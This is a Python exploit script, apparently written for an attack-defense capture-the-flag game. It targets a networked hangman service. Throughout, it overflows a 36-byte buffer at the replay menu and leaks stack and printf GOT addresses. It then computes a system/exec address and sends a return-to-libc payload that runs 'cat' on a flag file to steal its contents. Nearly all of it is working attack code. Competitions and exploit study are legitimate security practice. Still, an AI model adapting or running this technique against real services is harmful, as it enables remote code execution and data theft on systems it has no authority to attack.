#!/usr/bin/env python

import socket
import sys
import os
import random
import string
import subprocess
from pexpect import fdpexpect
from struct import pack

_USER_ = ''.join(random.choice(string.ascii_letters) for i in range(24))
_PASS_ = ''.join(random.choice(string.ascii_letters) for i in range(24))


# Expect strings
__EXP_USER_MENU__ = "C\\.\\) Create new user"
__EXP_GAME_MENU__ = "C\\.\\) Choose a category to play"
__EXP_END_GAME__ = "Sorry you missed it\\. The word is"
__EXP_FOUND_LETTER__ = "The number of letters you guessed:  \\[1\\]"
__EXP_REPLAY_MENU__ = "S\\.\\) Start another game in this category"
__EXP_MEMORY_INFO_STACK__ = "Stack:  0x"
__EXP_MEMORY_INFO_PRINTF__ =  "Error : Failed to open input directory - "

# Exploit addresses
__MEMORY_INFO_ADDR__ = pack('<I', 0x08048ae4)
__PRINTF_ADDR__ = pack('<I', 0x08048800)    # PLT address
__RETURN_ADDR__ = pack('<I', 0x08049b2a)    # fcn.replay_menu
__FORMAT_STRING_ADDR__ = pack('<I', 0x080513c8)    # Error: ... %s
__PRINTF_RELOC_ADDR__ = pack('<I', 0x08053008)    # reloc entry of printf
__BUFFER_SIZE__ = 0x24
__EXEC_OFFSET__ = 0xd0f0

def usage():
    print "Usage: %s <ip> <port> <flag_id>" % os.path.basename(__file__)

def exploit(ip, port, flag_id):
    # Open connection
    sock = socket.create_connection((ip, port))
    conn = fdpexpect.fdspawn(sock.fileno(), timeout=3)

    # Register the user
    conn.expect(__EXP_USER_MENU__)
    conn.sendline("c")
    conn.sendline(_USER_)
    conn.sendline(_PASS_)

    # Start a new game and fail it
    #conn.expect(__EXP_GAME_MENU__)
    conn.sendline("c")
    conn.sendline("0")
    conn.send("a\n"*6)
    # Check whether a 'z' was in the word
    ret = conn.expect([__EXP_FOUND_LETTER__, __EXP_END_GAME__])
    if ret == 0:
        conn.sendline("a")

    # Overflow the buffer
    conn.expect(__EXP_REPLAY_MENU__)
    conn.sendline("A"*__BUFFER_SIZE__+__MEMORY_INFO_ADDR__+__RETURN_ADDR__)
    conn.expect(__EXP_MEMORY_INFO_STACK__)
    stack = int(conn.read(8), 16)
    print "Stack address: 0x%x" % stack

    # Get printf address
    conn.expect(__EXP_REPLAY_MENU__)
    conn.send("A"*__BUFFER_SIZE__+__PRINTF_ADDR__)
    conn.sendline(__RETURN_ADDR__+__FORMAT_STRING_ADDR__+__PRINTF_RELOC_ADDR__)
    conn.expect(__EXP_MEMORY_INFO_PRINTF__)
    printf_addr = int(conn.read(4)[::-1].encode('hex'), 16)
    print "Printf address: 0x%x" % printf_addr

    # Address where to stack arguments for the exec function
    # 0x10 -> offset of the variable used in fcn.print_memory_info
    # 0x10 -> to compensate the 4 ret instructions
    # 0x0c -> offset to push system args
    cat_addr = stack + 0x10 + 0x10 + 0x0c

    exec_addr = printf_addr - __EXEC_OFFSET__
    print "exec address: 0x%x" % exec_addr

    payld = "A" * __BUFFER_SIZE__ + pack('<I', exec_addr)
    payld += __RETURN_ADDR__ + pack('<I', cat_addr)
    # The paylaod can't be longer than 0x3c characters
    payld += ("cat %s" % flag_id)[: 0x3c - len(payld) - 2] + '*\0'

    # Execute system('cat flag_id')
    conn.expect(__EXP_REPLAY_MENU__)
    conn.sendline(payld)
    conn.expect('\|(FLG.{13})$')
    flag = conn.match.group(1)
    return flag



if __name__ == '__main__':
    if len(sys.argv) < 4:
        usage()
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    print exploit(ip, port, flag_id)
